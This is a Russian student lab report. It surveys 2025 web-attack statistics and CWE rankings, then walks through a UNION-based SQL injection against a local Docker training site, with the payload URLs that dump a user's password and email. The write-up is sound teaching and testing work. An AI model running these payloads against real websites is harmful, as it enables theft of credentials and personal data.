@@ -1,0 +1,254 @@
+# Лабораторная работа №1  
+## Часть I
+
+---
+### 1. Использованные источники
+
+1. Verizon Data Breach Investigations Report (DBIR) 2025  
+https://www.verizon.com/business/resources/T16f/reports/2025-dbir-executive-summary.pdf
+
+2. Positive Technologies — «Актуальные киберугрозы: I–II кварталы 2025 года»  
+https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/
+
+3. Обзор CWE Top-25 (2025)  
+https://xakep.ru/2025/12/15/top-cwe-2025/
+
+---
+### 2.1 Доля успешных атак на организации через эксплуатацию веб-уязвимостей
+
+В отчёте **Verizon Data Breach Investigations Report (DBIR)** используется категория **Basic Web Application Attacks**, которая включает атаки на веб-приложения, в том числе эксплуатацию веб-уязвимостей.
+
+**Таблица 1 — Доля атак на веб-приложения**
+*Источник: Verizon DBIR 2025 Executive Summary.*
+
+| Источник     | Период | Scope     | Доля атак |
+| ------------ | ------ | --------- | --------- |
+| Verizon DBIR | 2024   | глобально | 9%        |
+| Verizon DBIR | 2025   | глобально | 12%       |
+
+В 2025 году доля атак увеличилась на 3% по сравнению с 2024 годом.
+
+---
+### 2.2 Распределение атак по отраслям организаций
+
+В различных исследованиях статистика атак может отличаться в зависимости от scope. 
+Например, по данным Positive Technologies наибольшее количество успешных атак приходится на госучреждения и промышленность.
+
+![[chart.png]]
+
+**Рисунок 1 — Жертвы среди организаций (доля успешных атак, H1 2025)**
+*Источник: Positive Technologies, «Актуальные киберугрозы: I–II кварталы 2025 года».*
+
+Наиболее часто атакам подвергаются:
+- госучреждения — **21%**
+- промышленность — **13%**
+- IT-компании — **6%**
+- медицинские учреждения — **6%**
+- наука и образование — **5%**
+
+---
+### 3. Распределение по конкретным уязвимостям
+
+Для анализа рассмотрим наиболее распространённые типы уязвимостей программного обеспечения, которые часто используются злоумышленниками при проведении атак.
+
+**Таблица 2 — Примеры распространённых уязвимостей**
+*Источник: Обзор CWE Top-25 (2025)*
+
+| CWE     | Уязвимость                           | Описание                                              | Оценка |
+| ------- | ------------------------------------ | ----------------------------------------------------- | ------ |
+| CWE-79  | Межсайтовый скриптинг (XSS)          | внедрение вредоносного JavaScript-кода в веб-страницы | 60.38  |
+| CWE-89  | SQL-инъекция                         | выполнение SQL-запросов через пользовательский ввод   | 28.72  |
+| CWE-352 | Подделка межсайтовых запросов (CSRF) | выполнение действий от имени пользователя             | 13.64  |
+| CWE-862 | Отсутствие проверки авторизации      | доступ к функциям без проверки прав                   | 13.28  |
+| CWE-787 | Out-of-bounds write                  | запись данных за пределами выделенной памяти          | 12.68  |
+| CWE-22  | Path Traversal                       | получение доступа к файловой системе сервера          | 8.99   |
+| CWE-416 | Use After Free                       | использование освобождённой области памяти            | 8.47   |
+| CWE-78  | Command Injection                    | выполнение команд операционной системы                | 7.85   |
+| CWE-94  | Code Injection                       | выполнение произвольного программного кода            | 7.57   |
+| CWE-120 | Buffer Overflow                      | переполнение буфера памяти                            | 6.96   |
+
+---
+# Часть 2
+
+После настройки docker-compose открываю сайт:
+http://localhost:8080
+На странице написано:
+> Введите в качестве параметра ваш id
+Но поля ввода на странице нет. Поэтому пробую передавать параметр `id` напрямую через URL.
+
+## Проверка параметра id
+
+Пробую разные значения.
+http://localhost:8080/task/?id=1
+Ответ:
+Ваш id:1  
+Ваш логин:admin
+
+http://localhost:8080/task/?id=2
+
+Ваш id:2  
+Ваш логин:Volk
+
+http://localhost:8080/task/?id=3
+
+Ваш id:3  
+Ваш логин:Matroskin
+
+http://localhost:8080/task/?id=4
+
+Ваш id:4  
+Ваш логин:Vinni-pukh
+
+http://localhost:8080/task/?id=5
+
+Ваш id:5  
+Ваш логин:Neznaika
+
+http://localhost:8080/task/?id=6
+
+Ваш id:6  
+Ваш логин:kotenok
+
+http://localhost:8080/task/?id=7
+
+Ваш id:7  
+Ваш логин:Karlson
+
+http://localhost:8080/task/?id=8
+
+Ваш id:8  
+Ваш логин:Kesha
+
+http://localhost:8080/task/?id=9
+
+Ваш id:9  
+Ваш логин:Volk2
+
+Таким образом нахожу пользователя **Volk2**, у него id = 9.
+
+# Проверка на SQL injection
+
+Пробую передать одинарную кавычку:
+http://localhost:8080/task/?id=1'
+Ответ:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+
+Из этого видно, что параметр id подставляется прямо в SQL-запрос без фильтрации.  
+Значит приложение уязвимо для **SQL Injection**.
+## Определение количества столбцов
+
+Теперь нужно понять, сколько столбцов возвращает исходный SQL-запрос.
+Пробую ORDER BY.
+
+http://localhost:8080/task/?id=1%27%20ORDER%20BY%201--%20
+
+Страница загрузилась.
+
+http://localhost:8080/task/?id=1%27%20ORDER%20BY%202--%20
+
+Страница загрузилась.
+
+http://localhost:8080/task/?id=1%27%20ORDER%20BY%203--%20
+
+Страница загрузилась.
+
+http://localhost:8080/task/?id=1%27%20ORDER%20BY%204--%20
+
+Ошибка:
+Unknown column '4' in 'order clause'
+
+Значит исходный SQL-запрос возвращает **3 столбца**.  
+Поэтому в `UNION SELECT` тоже нужно использовать **3 значения**.
+
+## Попытка получить пароль Volk2
+
+Предполагаю, что таблица называется `users` и в ней есть поля: id, user, password  
+
+Пробую запрос:
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20id,user,password%20from%20users%20where%20id=9%20--%20
+
+Ошибка:
+Unknown column 'user' in 'field list' 
+Пусть будет username.
+Пробую снова:
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20id,username,password%20from%20users%20where%20id=9%20--%20
+
+Ответ:
+
+Ваш id:9  
+Ваш логин:Volk2
+
+На странице выводятся только два столбца:id, логин  
+
+Поэтому меняю порядок колонок, чтобы пароль попал в вывод.
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20password,id,username%20from%20users%20where%20id=9%20--%20
+
+Ответ:
+
+Ваш id:Wa spoiuuuuu  
+Ваш логин:9
+
+Таким образом получаю пароль пользователя **Volk2**:
+
+**Wa spoiuuuuu**
+
+---
+
+# Поиск email пользователя Vinni-pukh
+
+Ранее нашел:
+
+id Vinni-pukh = 4
+
+Пробую найти email в таблице users.
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,password%20from%20users%20where%20id=4%20--%20
+
+Ошибка:
+Unknown column 'email' in 'field list'
+
+Пробую:
+email_id
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20id,email_id,password%20from%20users%20where%20id=4%20--%20
+
+Тоже ошибка.
+
+Значит email хранится в другой таблице.
+## Поиск таблиц базы данных
+
+Получаю список таблиц:
+
+http://localhost:8080/task/?id=-1%27%20UNION%20SELECT%20GROUP_CONCAT(table_name),1,2%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%20--%20
+
+Ответ: emails,users
+
+Значит в базе есть две таблицы: users, emails  
+
+## Получение email
+
+Работаю с таблицей emails.
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20id,password,email%20from%20emails%20where%20id=4%20--%20
+Unknown column 'password' in 'field list' - пароля нет в emails
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20id,email,3%20from%20emails%20where%20id=4%20--%20
+Unknown column 'email' in 'field list'. email тоже
+
+http://localhost:8080/task/?id=-1%27%20union%20select%20id,email_id,3%20from%20emails%20where%20id=4%20--%20
+А вот email_id есть. 
+
+Ваш id:4  
+Ваш логин:honey_lover@otus-lab.com
+
+Таким образом получаю email пользователя **Vinni-pukh**:
+
+honey_lover@otus-lab.com
+
+---
+# Ответ:
+Пароль Volk2 - **Wa spoiuuuuu**
+Почта Vinni-pukh - honey_lover@otus-lab.com
